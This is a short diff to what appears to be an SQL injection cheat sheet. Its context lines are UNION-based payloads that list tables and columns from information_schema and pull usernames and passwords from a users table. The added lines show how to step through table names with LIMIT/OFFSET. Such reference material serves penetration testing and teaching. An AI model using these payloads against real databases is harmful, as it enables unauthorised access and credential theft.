@@ -518,6 +518,9 @@ SELECT column_name FROM information_schema.columns
 ' UNION SELECT 1,2,CONCAT(TABLE_NAME) FROM information_schema.tables;-- - asd
 ' UNION SELECT 1,2,CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_NAME='user';-- - asd
 ' UNION SELECT 1,2,CONCAT(username,pwd) FROM users;-- - asd
+
+Changing to different table names using OFFSET instead of WHERE. Thanks to @iiLegacyyii for this information!
+SELECT CONCAT(TABLE_NAME) FROM information_schema.tables LIMIT 1 OFFSET 1
 ```
 
 ### Testing sql injection using sqlfiddle
